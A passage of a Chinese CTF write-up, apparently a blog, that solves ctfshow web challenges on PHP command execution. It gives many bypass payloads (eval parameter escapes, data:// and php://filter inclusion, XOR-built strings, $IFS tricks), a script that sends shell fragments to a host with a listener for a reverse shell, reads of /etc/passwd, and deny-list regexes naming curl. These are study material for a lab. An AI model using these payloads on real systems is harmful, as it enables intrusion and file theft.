将文件名按顺序写入到文件<code>ls -t &gt;a</code><br>步骤三：执行脚本<code>sh a</code>  </p><p><img src="/img/image-20231006192722087.png" alt="image-20231006192722087"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#encodeing:utf-8</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = &quot;http://192.168.1.6:19080/index.php?cmd=&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">list=[</span><br><span class="line">    &#x27;&gt;7777&#x27;</span><br><span class="line">    &#x27;\ \\&#x27;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;&gt;ca\\&#x27;</span><br><span class="line">    &#x27;ls -t&gt;a&#x27;</span><br><span class="line">]</span><br><span class="line">for i in list:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl + str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line">s.get(baseurl+&quot;sh a&quot;)</span><br></pre></td></tr></table></figure><p>记得打开kali监听</p><h3 id="长度限制为5绕过"><a href="#长度限制为5绕过" class="headerlink" title="长度限制为5绕过"></a>长度限制为5绕过</h3><h3 id="内联执行绕过"><a href="#内联执行绕过" class="headerlink" title="内联执行绕过"></a>内联执行绕过</h3><p>&#x2F;&#x2F;假设该目录有index.php和flag.php</p><ul><li>cat `ls`相当于执行了 cat index.php;cat flag.php</li><li>cat $(ls) 和上面一个意思<br>&#x2F;&#x2F;可以查看该目录及子目录和隐藏目录所有文件<br>find –</li></ul><h2 id="ctfshow中学到的新姿势"><a href="#ctfshow中学到的新姿势" class="headerlink" title="ctfshow中学到的新姿势"></a>ctfshow中学到的新姿势</h2><p>1、当;被过滤的时候要使用eval函数，由于后面;可以用?&gt;结尾,php代码的最后一个语句可以不用；</p><p>2、当flag或者读取文件被过滤时，可以试试mv、cp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;cp fla?.php 1.txt&quot;);</span><br><span class="line">?c=system(&quot;mv fla?.php 1.txt&quot;);</span><br></pre></td></tr></table></figure><p>cp:复制文件<br>mv:移动文件，在同一个目录内对文件进行剪切的操作，实际应理解成重命名操作<br>然后访问1.txt即可</p><p><img src="/img/image-20231103171911467.png" alt="image-20231103171911467"></p><p>3、当使用file_get_contents()函数需要输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo file_get_contents(&quot;1.txt&quot;);</span><br></pre></td></tr></table></figure><p>4、注意题目中是eval的时候一定要在代码后面加上&#96;。反引号和system&#x3D;反引号+echo</p><h3 id="WEB31"><a href="#WEB31" class="headerlink" title="WEB31"></a>WEB31</h3><p><img src="/img/image-20231103205530367.png" alt="image-20231103205530367"></p><p>方法一：经典参数逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure><p>方法二：直接绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo%09`tac%09fl*`;  </span><br></pre></td></tr></table></figure><p>方法三：构造无参数</p><p>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv()))); </span><br></pre></td></tr></table></figure><p>可以看到当前目录下有flag.php。 </p><p><img src="/img/image-20231103210617480.png" alt="image-20231103210617480"></p><p>通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231103210652828.png" alt="image-20231103210652828"></p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><img src="/img/image-20231103203049540.png" alt="image-20231103203049540"></p><p>过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br><span class="line">system</span><br><span class="line">php</span><br><span class="line">cat</span><br><span class="line">sort</span><br><span class="line">shell</span><br><span class="line">.</span><br><span class="line"> </span><br><span class="line">&#x27;</span><br><span class="line">`</span><br><span class="line">echo</span><br><span class="line">;</span><br><span class="line">(</span><br></pre></td></tr></table></figure><p>并且是区分大小写的</p><p>如果要使用下面这个payload，势必要绕过（过滤，暂时不会</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure><p>代码解释：第一个分号是因为外层还有一个eval，第二个分号是内层的eval</p><p>所以我们考虑其他方法。同样是传参嵌套在，这里使用的是include+伪协议读取。注意；被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231103203841690.png" alt="image-20231103203841690"></p><p>为什么要测试这个地址的文件读取呢</p><p>因为Linux系统中的 &#x2F;etc&#x2F;passwd文件,是系统用户配置文件,存储了系统中所有用户的基本信息,并且所有用户都可以对此文件执行读操作，测试了是否可以进行文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>include后面的%0a可以不用，这里的include如果被过滤也要想到使用require、require_once、include_once来替代</p><p>拿到flag</p><p>ps:为什么<code>$_GET[&#39;1&#39;]</code>可以写成<code>$_GET[1]</code>,因为php可以向下兼容</p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p><img src="/img/image-20231103235954752.png" alt="image-20231103235954752"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>看到文件包含就要想到伪协议</p><p>如果php被过滤可以使用短标签,但是有时候短标签没有开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;mv fla?.??? 1.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>include后面虽然拼接了.php，但不影响前面<code>&lt;?php phpinfo();?&gt;</code>执行，这是文件包含的特性了</p><p><img src="/img/image-20231104001130588.png" alt="image-20231104001130588"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>这题过滤了括号，但是是中文的括号，注意辨别，所以不影响解题</p><p>可以使用上面无参rce的经典payload，下面是ctfshow博主的题解，比较巧妙，可以学习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());   //var_dump</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231104001910198.png" alt="image-20231104001910198"></p><p>也可以右键源代码更加直观</p><p><img src="/img/image-20231112230337261.png" alt="image-20231112230337261"></p><p><code> get_defined_vars()</code>是一个 PHP 函数，用于获取当前作用域中已定义的所有变量的列表，并将它们存储在一个关联数组中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post传参：1=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231104002343239.png" alt="image-20231104002343239"></p><p>我们可以将数组弹出，来间接获取我们想要的payload，从而达到绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print(array_pop((next((get_defined_vars())))));</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231104003019833.png" alt="image-20231104003019833"></p><p>我们这里也是直接将post传参改成我们需要的了</p><p><img src="/img/image-20231104003059244.png" alt="image-20231104003059244"></p><p>直接配合嵌套eval函数</p><p>逻辑是内层eval执行返回<code>system(&quot;cat flag.php&quot;);</code>,然后外层eval执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop((next((get_defined_vars())))));</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231104003153294.png" alt="image-20231104003153294"></p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>方法一：通过脚本自动化实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤了数字和字母，以及 $、+、-、^、~ </span><br><span class="line">使得 异或自增 和 取反 构造字符都无法使用</span><br><span class="line">但是没有过滤 或运算符 |</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">yu师傅的异或脚本</a></p><p><a href="https://blog.csdn.net/qq_40345591/article/details/127773706">CTFshow wbe41 教你写脚本</a></p><p>大体上就是通过没有被过滤的可见或者不可见字符的url编码进行异或生成我们需要的被过滤字符，从而构造payload</p><p>方法二：手工构造</p><p>以上相当于使用 python 自动化脚本。当然也可以用上述得到的 txt 可用字符手动构造。rce_or.php会产生一个rce_or.txt文件，里面是可用的url组合。这里象征性地展示一些 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  %00 %20</span><br><span class="line">! %00 %21</span><br><span class="line">&quot; %00 %22</span><br><span class="line"># %00 %23</span><br><span class="line">% %00 %25</span><br><span class="line">&#x27; %00 %27</span><br><span class="line">( %00 %28</span><br><span class="line">) %00 %29</span><br><span class="line">* %00 %2a</span><br><span class="line">, %00 %2c</span><br><span class="line">. %00 %2e</span><br><span class="line">/ %00 %2f</span><br><span class="line">: %00 %3a</span><br><span class="line">; %00 %3b</span><br><span class="line">&lt; %00 %3c</span><br><span class="line">= %00 %3d</span><br><span class="line">&gt; %00 %3e</span><br><span class="line">? %00 %3f</span><br><span class="line">@ %00 %40</span><br><span class="line">\ %00 %5c</span><br><span class="line">_ %00 %5f</span><br><span class="line">` %00 %60</span><br><span class="line">| %00 %7c</span><br><span class="line">! %01 %20</span><br><span class="line">! %01 %21</span><br><span class="line"># %01 %22</span><br><span class="line"># %01 %23</span><br><span class="line">% %01 %25</span><br><span class="line">&#x27; %01 %27</span><br><span class="line">) %01 %28</span><br><span class="line">) %01 %29</span><br></pre></td></tr></table></figure><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;)</span><br><span class="line">(&#x27;system&#x27;)(&#x27;ls&#x27;)</span><br><span class="line">(system)(&#x27;ls&#x27;)</span><br><span class="line">(&#x27;system&#x27;)(ls)</span><br><span class="line">是一样的，都可以执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c=&#x27;(phpinfo)()&#x27;;</span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br><span class="line">输出：(phpinfo)()</span><br><span class="line">传入：eval(&quot;echo($c);&quot;);</span><br><span class="line">=&gt;eval(&quot;(phpinfo)();&quot;);</span><br></pre></td></tr></table></figure><p>所以可以直接构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如构造一个 (system)(&#x27;ls&#x27;)</span><br><span class="line">(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%00%0c%13%00&quot;|&quot;%27%60%60%27&quot;)</span><br><span class="line"></span><br><span class="line">其中 %13|%60=s     %19|%60=y      %14|%60=t</span><br></pre></td></tr></table></figure><p>构造(system)(cat flag.php) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</span><br></pre></td></tr></table></figure><p>用bp改包，hackbar试过了不行，不知道为什么</p><p><img src="/img/image-20231104130201014.png" alt="image-20231104130201014"></p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null：</span><br><span class="line">说明一下 /dev/null 说白了就是写入这个里面的内容都会丢失，读取这里面的内容什么也不会读取到</span><br><span class="line">而前面的 &gt; 表示重定向代表的是要去哪里</span><br><span class="line">因为 &gt; 前面没有数值，所以默认的是1，表示标准输出重定向到 /dev/null (空设备文件)</span><br><span class="line">因此不会显示任何的数据，同时也不会读取到任何的数据</span><br><span class="line"></span><br><span class="line">2&gt;&amp;1：</span><br><span class="line">这里的1表示stdout标准输出，系统默认值是1，因此 &gt; 前面没有值的时候就是默认标准输出 1&gt;</span><br><span class="line">这里的2表示stderr标准错误</span><br><span class="line">&amp;表示等同于的意思</span><br><span class="line">在这里这个语句的意思就表示2的输出重定向等同于1，即标准错误输出重定向等同于标准输出</span><br><span class="line">因为之前标准输出已经重定向到空设备文件，左移标准错误输出也重定向到空设备文件</span><br></pre></td></tr></table></figure><p>这整一句话的意思是：让所有输出流(不管你是对的还是错的)都重定向到空设备文件中丢弃掉</p><p>所以关键就是不能让后面这个重定向执行下去就行</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=tac flag.php||</span><br><span class="line">c=tac flag.php%0a// %0a是url编码，表示的是换行</span><br><span class="line">c=tac flag.php%26// %26是url编码，表示的是&amp;符</span><br><span class="line"></span><br><span class="line">此外，php版本小于5的时候因为php的底层是C，所以截断有另外的%00可以使用</span><br></pre></td></tr></table></figure><p>要注意的是在url中表示分隔查询参数，浏览器不会对其编码，如果要传输此字符需手动编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>过滤数字的时候不代表过滤了url编码%09这样的，因为解码后不属于数字,这里%09也不受%过滤的影响</p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x26是&amp;的16进制，0x09是%09的16进制，两个都被过滤</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php||</span><br><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.ph&#x27;&#x27;p||</span><br><span class="line">?c=tac&lt;&gt;fl&#x27;&#x27;ag.php||</span><br></pre></td></tr></table></figure><p>字符串中间加两个单引号，在执行的时候会忽略，命令也可以</p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cp$IFS/fla?$IFS/var/www/html/b.txt||</span><br></pre></td></tr></table></figure><p>flag在根目录，复制到默认的网页目录var&#x2F;www&#x2F;html，也可以pwd查看目录确定一下</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种过滤了大小写字母（或者还有数字），但是保留了点和问号就可以尝试这种姿势</p><p>不写了，这篇文章讲得很清楚</p><p><a href="https://blog.csdn.net/qq_40345591/article/details/127791317">https://blog.csdn.net/qq_40345591/article/details/127791317</a></p><p><img src="/img/image-20231112202231149.png" alt="image-20231112202231149"></p><p><img src="/img/image-20231112202139950.png" alt="image-20231112202139950"></p><p>要注意的是%20，@-[，不要写]</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=echo file_get_contents(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;flag.php&#x27;); </span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><p>法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include $_GET[1];</span><br><span class="line">?1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>法三：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include &#x27;flag.php&#x27;;echo $flag;</span><br><span class="line">c=include(&#x27;flag.php&#x27;);echo $flag;</span><br></pre></td></tr></table></figure><p>法四：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;flag.php&#x27;);var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure><p>包含了flag.php，那么 $flag变量就会被注册进去</p><p><img src="/img/image-20231112230712077.png" alt="image-20231112230712077"></p><p>法五：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=rename(&quot;flag.php&quot;,&quot;1.txt&quot;);  //然后访问1.txt</span><br></pre></td></tr></table></figure><p>法六：虽然这题被过滤，但是可以积累一下</p><p>curl实现get和post:<a href="https://www.php.cn/c10-1.html">https://www.php.cn/c10-1.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//初始化</span><br><span class="line">　　$ch = curl_init();</span><br><span class="line">　　//设置选项，包括URL</span><br><span class="line">　　curl_setopt($ch, CURLOPT_URL, &quot;http://www.learnphp.cn&quot;);</span><br><span class="line">　　curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">　　curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">　　//执行并获取HTML文档内容</span><br><span class="line">　　$output = curl_exec($ch);</span><br><span class="line">　　//释放curl句柄</span><br><span class="line">　　curl_close($ch);</span><br><span class="line">　　//打印获得的数据</span><br><span class="line">　　print_r($output);</span><br></pre></td></tr></table></figure><p>利用：修改<code>&quot;http://www.learnphp.cn&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$ch = curl_init();curl_setopt($ch, CURLOPT_URL, &quot;file:///var/www/html/flag.php&quot;);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);$output = curl_exec($ch);curl_close($ch);print_r($output);</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231112234238787.png" alt="image-20231112234238787"></p><p>被过滤了</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231112234746414.png" alt="image-20231112234746414"></p><figure class="highlight plaintext"><table><tr><td 